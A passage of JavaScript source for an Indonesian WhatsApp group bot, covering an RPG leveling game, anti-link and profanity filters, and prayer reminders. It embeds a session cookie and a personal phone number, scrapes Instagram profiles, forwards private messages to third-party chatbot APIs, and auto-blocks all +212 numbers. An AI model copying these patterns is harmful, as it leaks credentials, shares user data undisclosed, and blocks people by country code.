}, 1000);

//   setInterval(async () => {
//   async function(sendMessage(jid))
//   const jamna = new Date().toLocaleTimeString('en-US', { timeZone: "Asia/Jakarta" });
//   const hasilnes = jamna.split(':')[0] < 10 ? '0' + jamna : jamna;
//   if (hasilnes === '11:24:00 AM') {
//   const Pe = '6285161126317@s.whatsapp.net';
//   const message = `Trigger detected at specified time.`;
//   await sendMessage(Pe, message);
//   console.log('Message sent successfully to the specified number at the specified time.');
//   }
// }, 1000);
/**
//  * Constantly checking premium.
//  * @param {Object} _dir 
//  */
//   const jamna = new Date().toLocaleTimeString('en-US', { timeZone: "Asia/Jakarta" });
//   const hasilnes = jamna.split(':')[0] < 10 ? '0' + jamna : jamna
//   setInterval(() => {
//       let position = null
//       Object.keys(_dir).forEach((i) => {
//           if (Date.now() >= _dir[i].expired) {
//               position = i
//           }
//       })
//       if (position !== null) {
//           console.log(`Premium expired: ${_dir[position].id}`)
//           let txt = `Premium Expired, Terimakasih Sudah Berlangganan`
//           haruka.sendMessage(_dir[position].id, { text: txt })
//           _dir.splice(position, 1)
//           fs.writeFileSync('./database/premium.json', JSON.stringify(_dir, null, 2))
//       }
//   }, 1000)
if (jam === 5) {
console.log("babi")
// if (m.isGroup &&(isAutoAiGc || setting.auto_ai_grup) && !isCmd) {
//   try {
//   newReply("Sedang dilakukan maintenace pada bot selama satu jam\nHarap menunggu")
//   } catch (err) {
//   //console.log(err);
//   newReply("Upss error silahkan hubungi owner agar di fix")
//   //newReply(JSON.stringify(err));
//   }
//   }
}
const reply = (teks) => {
return juna.sendMessage(m.chat, { text: teks, mentions: ments(teks) }, {quoted: m})
}
//Function Polling
juna.ments = (teks = '') => {
return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : []
};
juna.sendteks = async(chatId, text = '', quoted = '', opts = {}) => {
return juna.sendMessage(chatId, { text: text, mentions: await juna.ments(text), ...opts}, {quoted:quoted})
};
juna.sendPoll = (jid, name = '', values = [], selectableCount = global.select) => {
return juna.sendMessage(jid, {poll: { name, values, selectableCount }})
};
// RESPON CMD POLL MESSAGE THE JO BOT
async function getMessage(key){
if (store) {
const msg = await store.loadMessage(key.remoteJid, key.id)
return msg?.message
}
return {conversation: '𝙅𝙪𝙣𝙖𝘽𝙤𝙩-𝙈𝙙'}
}

juna.ev.on('messages.update', async(chatUpdate) => {
for (const { key, update } of chatUpdate) {
if (update.pollUpdates && key.fromMe) {
const pollCreation = await getMessage(key)
if (pollCreation) {
const pollUpdate = await getAggregateVotesInPollMessage({
message: pollCreation,
pollUpdates: update.pollUpdates,
})
const command = pollUpdate.filter(v => v.voters.length !== 0)[0]?.name
if (command == undefined) return
const comand = global.prefix+command
console.log(comand)
juna.appenTextMessage(comand, chatUpdate)
}
}
}
})
const nebal = (angka) => {
return Math.floor(angka)
}
if(!isPetualang){
reqXp = 5000 * (Math.pow(2, getLevelingLevel(m.sender)) - 1)
await _petualang.push(m.sender)
await addInventoriDarah(m.sender, DarahAwal)
await addInventori(m.sender)
await addInventoriBuruan(m.sender)
await fs.writeFileSync('./database/user/inventory.json', JSON.stringify(_petualang))
await addLevelingId(m.sender)
console.log(`${pushname} 𝙏𝙚𝙡𝙖𝙝 𝘿𝙞𝙩𝙖𝙢𝙗𝙖𝙝𝙠𝙖𝙣 𝙆𝙚𝙙𝙖𝙡𝙖𝙢 𝘿𝙖𝙩𝙖𝙗𝙖𝙨𝙚`)
}

function hitungmundur(tanggal, bulan, tahun){
let from = new Date(`${bulan} ${tanggal}, ${tahun} 00:00:00`).getTime();
let now = Date.now();
let distance = from - now;
let days = Math.floor(distance / (1000 * 60 * 60 * 24));
let hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
let minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
let seconds = Math.floor((distance % (1000 * 60)) / 1000);
return days + ' Hari ' + hours + ' Jam ' + minutes + ' Menit ' + seconds + ' Detik'
}

const isEmoji = (emo) => {
let emoji_ranges = /(?:[\u2700-\u27bf]|(?:\ud83c[\udde6-\uddff]){2}|[\ud800-\udbff][\udc00-\udfff]|[\u0023-\u0039]\ufe0f?\u20e3|\u3299|\u3297|\u303d|\u3030|\u24c2|\ud83c[\udd70-\udd71]|\ud83c[\udd7e-\udd7f]|\ud83c\udd8e|\ud83c[\udd91-\udd9a]|\ud83c[\udde6-\uddff]|\ud83c[\ude01-\ude02]|\ud83c\ude1a|\ud83c\ude2f|\ud83c[\ude32-\ude3a]|\ud83c[\ude50-\ude51]|\u203c|\u2049|[\u25aa-\u25ab]|\u25b6|\u25c0|[\u25fb-\u25fe]|\u00a9|\u00ae|\u2122|\u2139|\ud83c\udc04|[\u2600-\u26FF]|\u2b05|\u2b06|\u2b07|\u2b1b|\u2b1c|\u2b50|\u2b55|\u231a|\u231b|\u2328|\u23cf|[\u23e9-\u23f3]|[\u23f8-\u23fa]|\ud83c\udccf|\u2934|\u2935|[\u2190-\u21ff])/g;
let regexEmoji = new RegExp(emoji_ranges, 'gi');
return emo.match(regexEmoji)
}

async function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}

async function igstalk(Username) {
return new Promise((resolve, reject) => {
axios.get('https://dumpor.com/v/'+Username, {
headers: {
"cookie": "_inst_key=SFMyNTY.g3QAAAABbQAAAAtfY3NyZl90b2tlbm0AAAAYWGhnNS1uWVNLUU81V1lzQ01MTVY2R0h1.fI2xB2dYYxmWqn7kyCKIn1baWw3b-f7QvGDfDK2WXr8",
"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
}
}).then(res => {
const $ = cheerio.load(res.data)
const result = {
profile: $('#user-page > div.user > div.row > div > div.user__img').attr('style').replace(/(background-image: url\(\'|\'\);)/gi, ''),
fullname: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > a > h1').text(),
username: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > h4').text(),
post: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(1)').text().replace(' Posts',''),
followers: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(2)').text().replace(' Followers',''),
following: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(3)').text().replace(' Following',''),
bio: $('#user-page > div.user > div > div.col-md-5.my-3 > div').text()
}
resolve(result)
})
})
}

async function getGcName(groupID) {
try {
let data_name = await juna.groupMetadata(groupID)
return data_name.subject
} catch (err) {
return '-'
}
}

function randomNomor(min, max = null) {
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}
}
/*if ( m.mtype == 'viewOnceMessage' && m.msg.viewOnce) {
try {
juna.ev.emit("viewOnceMessage", m);
} catch (err) {
console.error(util.format(err))
}}*/
try {
let chats = db.data.chats[m.chat]
if (typeof chats !== 'object') db.data.chats[m.chat] = {}
if (chats) {
if (!('goodbye' in chats)) chats.goodbye = setting.auto_leaveMsg
if (!('welcome' in chats)) chats.welcome = setting.auto_welcomeMsg
} else db.data.chats[m.chat] = {
goodbye: setting.auto_leaveMsg, 
welcome: setting.auto_welcomeMsg, 
}
} catch (e){
console.log(e)
}
// User Ban
const banUser = await juna.fetchBlocklist()
// Public & Self
if (!juna.public) {
if (!m.key.fromMe) return
}


if (m.isGroup) {
const Fisha = await getMancingIkan(m.sender)
const FishId = await getMancingId(m.sender)
if (Fisha === undefined && FishId === undefined) await addMancingId(m.sender)
}

if (m.isGroup) {
const Hapea = await getBertualangPlanet(m.sender)
const HapeId = await getPlaneId(m.sender)
if (Hapea === undefined && HapeId === undefined) await addPlaneId(m.sender)
}

if (m.isGroup) {
const Coala = await getMiningcoal(m.sender)
const CoalId = await getMiningId(m.sender)
if (Coala === undefined && CoalId === undefined) await addMiningId(m.sender)
}

if (m.isGroup) {
const Stonea = await getMiningstone(m.sender)
const StoneId = await getBatuId(m.sender)
if (Stonea === undefined && StoneId === undefined) await addBatuId(m.sender)
}

if (m.isGroup) {
const Orea = await getMiningore(m.sender)
const OreId = await getOreId(m.sender)
if (Orea === undefined && OreId === undefined) await addOreId(m.sender)
}

if (m.isGroup) {
const Ingota = await getMiningingot(m.sender)
const IngotId = await getIngotId(m.sender)
if (Ingota === undefined && IngotId === undefined) await addIngotId(m.sender)
}

if (m.isGroup) {
const Kayua = await getNebangKayu(m.sender)
const KayuId = await getNebangId(m.sender)
if (Kayua === undefined && KayuId === undefined) await addNebangId(m.sender)
}

if (m.isGroup ) {
const checkATM = await checkATMuser(m.sender)
try {
if (checkATM === undefined) await addATM(m.sender)
const uangsaku = Math.floor(Math.random() * 10) + 90
addKoinUser(m.sender, uangsaku)
} catch (err) {
console.error(err)
}
}
const levelRole = await getLevelingLevel(m.sender)
var role = 'Bronze 1'
if (levelRole <= 2) {
role = 'Bronze 1'
} else if (levelRole <= 10) {
role = 'Bronze 2'
} else if (levelRole <= 20) {
role = 'Bronze 3'
} else if (levelRole <= 30) {
role = 'Bronze 4'
} else if (levelRole <= 40) {
role = 'Bronze 5'
} else if (levelRole <= 70) {
role = 'Silver 1'
} else if (levelRole <= 85) {
role = 'Silver 2'
} else if (levelRole <= 95) {
role = 'Silver 3'
} else if (levelRole <= 105) {
role = 'Silver 4'
} else if (levelRole <= 125) {
role = 'Silver 5'
} else if (levelRole <= 150) {
role = 'Gold 1'
} else if (levelRole <= 170) {
role = 'Gold 2'
} else if (levelRole <= 190) {
role = 'Gold 3'
} else if (levelRole <= 210) {
role = 'Gold 4'
} else if (levelRole <= 230) {
role = 'Gold 5'
} else if (levelRole <= 260) {
role = 'Platinum 1'
} else if (levelRole <= 290) {
role = 'Platinum 2'
} else if (levelRole <= 320) {
role = 'Platinum 3'
} else if (levelRole <= 350) {
role = 'Platinum 4'
} else if (levelRole <= 380) {
role = 'Platinum 5'
} else if (levelRole <= 410) {
role = 'Diamond 1'
} else if (levelRole <= 450) {
role = 'Diamond 2'
} else if (levelRole <= 500) {
role = 'Diamond 3'
} else if (levelRole <= 550) {
role = 'Diamond 4'
} else if (levelRole <= 600) {
role = 'Diamond 5'
} else if (levelRole <= 700) {
role = 'Master'
} else if (levelRole <= 800) {
role = 'Master ✩'
} else if (levelRole <= 900) {
role = 'Master ✩✩'
} else if (levelRole <= 1000) {
role = 'Master ✩✩✩'
} else if (levelRole <= 1100) {
role = 'Master ✯'
} else if (levelRole <= 1225) {
role = 'Master ✯✯'
} else if (levelRole <= 1340) {
role = 'Master ✯✯✯'
} else if (levelRole <= 1400) {
role = 'GrandMaster'
} else if (levelRole <= 1555) {
role = 'GrandMaster ✩'
} else if (levelRole <= 1660) {
role = 'GrandMaster ✩✩'
} else if (levelRole <= 1710) {
role = 'GrandMaster ✩✩✩'
} else if (levelRole <= 1825) {
role = 'GrandMaster ✯'
} else if (levelRole <= 1950) {
role = 'GrandMaster ✯✯'
} else if (levelRole <= 2000) {
role = 'GrandMaster ✯✯✯'
} else if (levelRole <= 2220) {
role = 'Legends'
} else if (levelRole <= 2500) {
role = 'Legends 2'
} else if (levelRole <= 2700) {
role = 'Legends 3'
} else if (levelRole <= 2900) {
role = 'Legends 4'
} else if (levelRole <= 3100) {
role = 'Legends 5'
} else if (levelRole <= 3300) {
role = 'Legends 6'
} else if (levelRole <= 3600) {
role = 'Legends 7'
} else if (levelRole <= 3900) {
role = 'Legends 8'
} else if (levelRole <= 4200) {
role = 'Legends 9'
} else if (levelRole <= 4450) {
role = 'Legends 10'
} else if (levelRole <= 4700) {
role = 'Legends 忍'
} else if (levelRole <= 4900) {
role = 'Legends 忍¹'
} else if (levelRole <= 5100) {
role = 'Legends 忍²'
} else if (levelRole <= 5600) {
role = 'Legends 忍³'
} else if (levelRole <= 6100) {
role = 'Legends 忍⁴'
} else if (levelRole <= 7000) {
role = 'GrandLegends'
} else if (levelRole <= 10000) {
role = 'GrandLegends 1'
} else if (levelRole <= 20000) {
role = 'GrandLegends 2'
} else if (levelRole <= 30000) {
role = 'GrandLegends 3'
} else if (levelRole <= 40000) {
role = 'GrandLegends 4'
} else if (levelRole <= 50000) {
role = 'GrandLegends 忍¹'
} else if (levelRole <= 60000) {
role = 'GrandLegends 忍²'
} else if (levelRole <= 70000) {
role = 'GrandLegends 忍³'
} else if (levelRole <= 80000) {
role = 'GrandLegends 忍⁴'
} else if (levelRole <= 90000) {
role = 'Pro 숒'
} else if (levelRole <= 100000) {
role = 'Pro × GrandLegends 숒'
}

// Push Message To Console
if (m.message) {
console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m ChiwaBotMD \x1b[1;37m]', time, chalk.green(budy.slice(0, 100) || m.mtype), 'from', chalk.green(pushname), 'in', chalk.green(groupName ? groupName : 'Private Chat' ), 'args :', chalk.green(text.length))
}

const buttonsDefault = [
{ urlButton: { displayText: `Instagram`, url: `${setting.instagram}` } },
{ urlButton: { displayText: `Group WhatsApp`, url: `${setting.gcwa}` } },
{ quickReplyButton: { displayText: `👤 Owner`, id: `.owner` } },
{ quickReplyButton: { displayText: `Donate 💰`, id: `.donate` } },
{ quickReplyButton: { displayText: `⚡ Sewa ⚡`, id: `.sewabot` } }
]
_sewa.expiredCheck(juna, sewa)
_prem.expiredCheck(juna, premium)

setInterval(() => {
for (let i of Object.values(opengc)) {
if (Date.now() >= i.time) {
juna.groupSettingUpdate(i.id, "not_announcement")
.then((res) =>
juna.sendMessage(i.id, { text: `Sukses, group telah dibuka` }))
.catch((err) =>
juna.sendMessage(i.id, { text: 'Error' }))
delete opengc[i.id]
fs.writeFileSync('./database/opengc.json', JSON.stringify(opengc))
}
}
}, 1000)
// auto set bio
if (setting.autobio){
if (setting.autobio === false) return
let settingstatus = 0;
if (new Date() * 1 - settingstatus > 1000) {
await juna.setStatus(`I'm ${juna.user.name} 🤖 | ${runtime(process.uptime())} ⏰ | Status : ${juna.mode ? "Public Mode" : "Self Mode"} | ${pendaftar.length} Users`)
settingstatus = new Date() * 1
}
}
if(!isCreator && setting.grupOnly && !m.isGroup){
return
}
if(!isCreator && setting.japriOnly && m.isGroup){
return
}

/////
var bodynyaui = (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
 for (let zeeone of setiker){
	if (!bodynyaui && budy === zeeone){
		result = fs.readFileSync(`./database/${zeeone}.webp`)
		await juna.sendStickerFromUrl(m.chat, result, m, {packname: `Created By ${setting.botName}\n${tanggal(new Date())}` , author: `Owner ${setting.ownerName}\nTime ${time}` })
		}
		}
for (let zeeonee of audionye){
if (!bodynyaui && budy === zeeonee){
result = fs.readFileSync(`./database/${zeeonee}.mp3`)
juna.sendAudio(m.chat, result, m, true)
}
}
for (let zeeoneee of imagenye){
if (!bodynyaui && budy === zeeoneee){
result = fs.readFileSync(`./database/${zeeoneee}.jpg`)
juna.sendImage(m.chat, result, '', m)
}
}
for (let zeeonew of videonye){
if (!bodynyaui && budy === zeeonew){
result = fs.readFileSync(`./database/${zeeonew}.mp4`)
juna.sendVideo(m.chat, result, false, "",m)
}
}
async function addCountCmdUser(nama, sender, u) {
var posi = null
var pos = null
Object.keys(u).forEach((i) => {
if (u[i].jid === sender) {
posi = i
}
})
if (posi === null) {
u.push({jid: m.sender, db: [{nama: nama, count: 0}]})
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
Object.keys(u).forEach((i) => {
if (u[i].jid === m.sender) {
posi = i
}
})
}
if (posi !== null) {
Object.keys(u[posi].db).forEach((i) => {
if (u[posi].db[i].nama === nama) {
pos = i
}
})
if (pos === null) {
u[posi].db.push({nama: nama, count: 1})
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
} else {
u[posi].db[pos].count += 1
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
}
}
}

async function getPosiCmdUser(sender, _db) {
var posi = null
Object.keys(_db).forEach((i) => {
if (_db[i].jid === sender) {
posi = i
}
})
return posi
}

async function addCountCmd(nama, sender, _db) {
addCountCmdUser(nama, m.sender, _cmdUser)
var posi = null
Object.keys(_db).forEach((i) => {
if (_db[i].nama === nama) {
posi = i
}
})
if (posi === null) {
_db.push({nama: nama, count: 1})
fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
} else {
_db[posi].count += 1
fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
}
}

// Store
if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
juna.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
juna.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: m
})
}
}
const sendFileFromUrl = async (from, url, caption, mek, men) => {
let mime = '';
let res = await axios.head(url)
mime = res.headers['content-type']
if (mime.split("/")[1] === "gif") {
return juna.sendMessage(m.chat, { video: await getBuffer(url), caption: caption, gifPlayback: true, mentions: men ? men : [], mimetype: 'video/mp4'}, {quoted: m})
}
let type = mime.split("/")[0]+"Message"
if(mime === "application/pdf"){
return juna.sendMessage(m.chat, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, mentions: men ? men : []}, {quoted: m })
}
if(mime.split("/")[0] === "image"){
return juna.sendMessage(m.chat, { image: await getBuffer(url), caption: caption, mentions: men ? men : []}, {quoted: m})
}
if(mime.split("/")[0] === "video"){
return juna.sendMessage(m.chat, { video: await getBuffer(url), caption: caption, mentions: men ? men : [], mimetype: 'video/mp4'}, {quoted: m})
}
if(mime.split("/")[0] === "audio"){
return juna.sendMessage(m.chat, { audio: await getBuffer(url), caption: caption, mentions: men ? men : [], mimetype: 'audio/mpeg'}, {quoted: m })
}
}
// Auto Read & Presence Online
if (!m.key.fromMe && setting.autoread){
const readkey = {
remoteJid: m.chat,
id: m.key.id, 
participant: m.isGroup ? m.key.participant : undefined 
}
await juna.readMessages([readkey]);
}

juna.sendPresenceUpdate('available', m.chat)

// Auto Registrasi
if (isCmd && !isUser) {
pendaftar.push(m.sender)
fs.writeFileSync('./database/user.json', JSON.stringify(pendaftar, null, 2))
}
// kyuto
if (jam === 3) {
console.log("dongo")
newRepy("Sedang dilakukan maintenace pada")
}

// Auto Block +212
if (m.sender.startsWith('212') && setting.autoblok212 === true) {
return juna.updateBlockStatus(m.sender, 'block')
}

if (!m.isGroup && !m.key.fromMe && setting.autorespond && !isCmd) {
simi = await fetchJson(`https://api.simsimi.net/v2/?lc=id&cf=false&text=${command}`)
newReply('_' + simi.success +'_') 
}
if (!m.isGroup && !m.key.fromMe && (isAutoAiPc || setting.auto_ai_japri) && !isCmd) {
try {
let ini = await fetchJson(`https://api.junn4.my.id/ai/chatGPT?text=${budy}`)
let hasil = `${ini.result}`
newReply(hasil)
} catch (err) {
//console.log(err);
newReply("Upss error silahkan hubungi owner agar di fix")
//newReply(JSON.stringify(err));
}
}
if (jam === 5) {
console.log("triger berhasi")
// if (m.isGroup &&(isAutoAiGc || setting.auto_ai_grup) && !isCmd) {
//   try {
//   newReply("Sedang dilakukan maintenace pada bot selama satu jam\nHarap menunggu")
//   } catch (err) {
//   //console.log(err);
//   newReply("Upss error silahkan hubungi owner agar di fix")
//   //newReply(JSON.stringify(err));
//   }
//   }
}
// if (m.isGroup && !m.key.fromMe && (isAutoAiGc || setting.auto_ai_grup) && !isCmd) {
// try {
// let ini = await fetchJson(`https://api.junn4.my.id/ai/chatGPT?text=${budy}`)
// let hasil = `${ini.result}`
// newReply(hasil)
// } catch (err) {
// //console.log(err);
// newReply("Upss error silahkan hubungi owner agar di fix")
// //newReply(JSON.stringify(err));
// }
// }
// Sholat Reminder 729142 lines
// if (m.isGroup && (isAutoAiGc || setting.auto_ai_grup) && !isCmd) {
//   try {
//     const jamna = new Date().toLocaleTimeString('en-US', { timeZone: "Asia/Jakarta" });
//     const hasilnes = jamna.split(':')[0] < 10 ? '0' + jamna : jamna
//     if(hasilnes === '01: PM') {
//     limit = []
//     fs.writeFileSync('./database/limit.json', JSON.stringify(limit))
//     glimit = []
//     fs.writeFileSync('./database/glimit.json', JSON.stringify(glimit))
//     console.log("Limit Sudah Di Reset!")
//     }
//   newReply('cek console log mak')
//   } catch (err) {
//   console.log(err);
//   newReply("Upss error silahkan hubungi owner agar di fix")
//   //newReply(JSON.stringify(err));
//   }
//   }
// Anti Link
if (isAntiLink) {
if (budy.match(`chat.whatsapp.com`)) {
newReply(`*「 GROUP LINK DETECTOR 」*\n\nSepertinya kamu mengirimkan link grup, maaf pesan akan dihapus`)
if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
let gclink = (`https://chat.whatsapp.com/`+await juna.groupInviteCode(m.chat))
await juna.sendMessage(m.chat, { delete: m.key })
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return newReply(`Gajadi, Karena kamu ngirim link group ini`)
if (isAdmins) return newReply(`Gajadi, Kamu admin`)
if (isCreator) return newReply(`Gajadi, Kamu ownerku`)
await juna.sendMessage(m.chat, {
delete: {
remoteJid: m.chat,
fromMe: false,
id: m.key.id,
participant: m.key.participant
}
})
}
}
if (isAntiLink) {
  // Link universal
  if (budy.match('https://')) {
    await newReply(`*「 UNIVERSAL LINK DETECTOR 」*\n\nSepertinya kamu mengirimkan link, maaf pesan akan dihapus`);
    if (!isBotAdmins) return await newReply(`Anjir lupa gw bukan admin`);
    if (isAdmins) return await newReply(`Anjir, gajadi kamu admin ^^`);
    if (isCreator) return await newReply(`Gajadi, Kamu ownerku`);
    await juna.sendMessage(m.chat, { delete: m.key });
  }

  // Link t.me
  if (budy.match('t.me')) {
    await newReply(`*「 TELE LINK DETECTOR 」*\n\nSepertinya kamu mengirimkan link, maaf pesan akan dihapus`);
    if (!isBotAdmins) return await newReply(`Anjir lupa gw bukan admin`);
    if (isAdmins) return await newReply(`Anjir, gajadi kamu admin ^^`);
    if (isCreator) return await newReply(`Gajadi, Kamu ownerku`);
    await juna.sendMessage(m.chat, { delete: m.key });
  }
}
// batas awal deaktif kode
// setInterval(function() {
// var jamna = new Date().toLocaleTimeString('en-US', { timeZone: "Asia/Jakarta" });
// var hasilnes = jamna.split(':')[0] < 10 ? '0' + jamna : jamna
// if(hasilnes === '04:38:00 AM') {
// juna.sendMessage("120363069927279039@g.us", {text: `Waktu Subuh Telah Tiba, Ambilah Air Wudhu Dan Segera Sholat Untuk Wilayah Jakarta Dan Sekitarnya`})
// }if(hasilnes === '11:55:00 AM') {
// juna.sendMessage("120363069927279039@g.us", {text: `Waktu Dzuhur Telah Tiba, Ambilah Air Wudhu Dan Segera Sholat Untuk Wilayah Jakarta Dan Sekitarnya`})
// }if(hasilnes === '03:14:00 PM') {
// juna.sendMessage("120363069927279039@g.us", {text: `Waktu Ashar Telah Tiba, Ambilah Air Wudhu Dan Segera Sholat Untuk Wilayah Jakarta Dan Sekitarnya`})
// }if(hasilnes === '05:55:00 PM') {
// juna.sendMessage("120363069927279039@g.us", {text: `Waktu Maghrib Telah Tiba, Ambilah Air Wudhu Dan Segera Sholat Untuk Wilayah Jakarta Dan Sekitarnya`})
// }if(hasilnes === '12:47:00 PM') {
// juna.sendMessage("6285161126317@s.whatsapp.net", {text: `TRIGER TELAH TERDETEKSI PADA PUKUL 12:33:00 `})
// }
// }, 1000);
// fix pengingat jadwal sholat
// chiwarajinibadah
// shubuh
// setInterval(function() {
//     var jamna = new Date().toLocaleTimeString('en-US', { timeZone: "Asia/Jakarta" });
//     var hasilnes = jamna.split(':')[0] < 10 ? '0' + jamna : jamna;
    
//     if (hasilnes === '04:24:00 AM') {
//         juna.sendMessage("120363179591032307@g.us", {text: `「 SHUBUH 」\n\nWaktu Sholat Shubuh Telah Tiba, Ambilah Air Wudhu Dan Segera Sholat Untuk Wilayah Sleman,DIY dan sekitarnya.` , mentions: participants.map(a => a.id)});
//     }
// }, 1000);
// //dhuhur
// setInterval(function() {
//     var jamna = new Date().toLocaleTimeString('en-US', { timeZone: "Asia/Jakarta" });
//     var hasilnes = jamna.split(':')[0] < 10 ? '0' + jamna : jamna;
    
//     if (hasilnes === '11:40:00 AM') {
//         juna.sendMessage("120363179591032307@g.us", {text: `「 DHUHUR 」\n\nWaktu Sholat Dhuhur Telah Tiba, Ambilah Air Wudhu Dan Segera Sholat Untuk Wilayah Sleman,DIY dan sekitarnya.` , mentions: participants.map(a => a.id)});
//     }
// }, 1000);
// // Ashar
// setInterval(function() {
//     var jamna = new Date().toLocaleTimeString('en-US', { timeZone: "Asia/Jakarta" });
//     var hasilnes = jamna.split(':')[0] < 10 ? '0' + jamna : jamna;
    
//     if (hasilnes === '03:00:00 PM') {
//         juna.sendMessage("120363179591032307@g.us", {text: `「 ASHAR 」\n\nWaktu Sholat Ashar Telah Tiba, Ambilah Air Wudhu Dan Segera Sholat Untuk Wilayah Sleman,DIY dan sekitarnya.` , mentions: participants.map(a => a.id)});
//     }
// }, 1000);
// // Maghrib
// setInterval(function() {
//     var jamna = new Date().toLocaleTimeString('en-US', { timeZone: "Asia/Jakarta" });
//     var hasilnes = jamna.split(':')[0] < 10 ? '0' + jamna : jamna;
    
//     if (hasilnes === '05:38:00 PM') {
//         juna.sendMessage("120363179591032307@g.us", {text: `「 MAGHRIB 」\n\nWaktu Sholat Maghrib Telah Tiba, Ambilah Air Wudhu Dan Segera Sholat Untuk Wilayah Sleman,DIY dan sekitarnya.` , mentions: participants.map(a => a.id)});
//     }
// }, 1000);
// // isya
// setInterval(function() {
//     var jamna = new Date().toLocaleTimeString('en-US', { timeZone: "Asia/Jakarta" });
//     var hasilnes = jamna.split(':')[0] < 10 ? '0' + jamna : jamna;
    
//     if (hasilnes === '06:48:00 PM') {
//         juna.sendMessage("120363179591032307@g.us", {text: `「 ISYA 」\n\nWaktu Sholat Isya Telah Tiba, Ambilah Air Wudhu Dan Segera Sholat Untuk Wilayah Sleman,DIY dan sekitarnya.` , mentions: participants.map(a => a.id)});
//     }
// }, 1000);
// // bobo
// setInterval(function() {
//     var jamna = new Date().toLocaleTimeString('en-US', { timeZone: "Asia/Jakarta" });
//     var hasilnes = jamna.split(':')[0] < 10 ? '0' + jamna : jamna;
    
//     if (hasilnes === '09:06:00 PM') {
//         juna.sendMessage("120363179591032307@g.us", {text: `「 BOBOK 」\n\nWaktu Menunjukkan Pukul 21:06 WIB,Silahkan Beristirahat.` , mentions: participants.map(a => a.id)});
//         console.log('Bobok Coy')
//     }
// }, 1000);
// // reboot msg
// // setInterval(function() {
// // async function gaje() {
// //   await reboot();
// // }
// // }, 60000); // Cek setiap 1 menit
// // Fungsi untuk memeriksa waktu saat ini
// async function checkTime() {
//   // Keluar dari fungsi jika sedang dalam proses
//   let now = new Date();
//   let minutes = now.getMinutes();
  
//   // Jalankan kode jika menitnya adalah 52
//   if (minutes === 45) {
//     console.log("Saatnya menjalankan kode!");
    
//     let countdown = [];
//     for(let i = 60; i >= 0; i--) {
//       countdown.push(`Countdown: ${i} detik`);
//     }
    
//     // Mengirim pesan pertama untuk memulai hitung mundur
//     let { key } = await juna.sendMessage("120363179591032307@g.us", {text: 'Mulai hitung mundur dari 60 detik.'});
    
//     // Mengirim pesan hitung mundur dan mengeditnya
//     for (let i = 0; i < countdown.length; i++) {
//       await delay(1000); // Delay per detik
//       await juna.sendMessage("120363284228659844@g.us", {text: countdown[i], edit: key });
//     }
    
//     // Mengirim pesan setelah hitung mundur selesai
//     await juna.sendMessage("120363284228659844@g.us", {text: 'Hitung mundur selesai', edit: key });
//   }
  
// }

// // Periksa waktu saat ini setiap detik menggunakan setInterval
// setInterval(checkTime, 43000); // 1000 milidetik = 1 detik
// batas akhir deactive kode




const warntoxic = 'Kata Toxic terdeteksi,Pesan Akan Di Hapus'
const toxicdel = 'Pesan telah dihapus,jgn toxic gih'
if (budy.match('kontol') && (m.isGroup)) {
  newReply('Kata Toxic terdeteksi,Pesan Akan Di Hapus')
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  newReply(`${toxicdel}`)
}
if (budy.match('kntl') && (m.isGroup)) {
  newReply(`${warntoxic}`)
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  newReply(`${toxicdel}`)
}
if (budy.match('memek') && (m.isGroup)) {
  newReply(`${warntoxic}`)
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  newReply(`${toxicdel}`)
}
if (budy.match('anjenk') && (m.isGroup)) {
  newReply(`${warntoxic}`)
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  newReply(`${toxicdel}`)
}
if (budy.match('bangsat') && (m.isGroup)) {
  newReply(`${warntoxic}`)
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
  newReply(`${toxicdel}`)
}
if (budy.match('tolol') && (m.isGroup)) {
  newReply(`${warntoxic}`)
  if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
  await sleep(1000)
  await juna.sendMessage(m.chat, { delete: m.key })
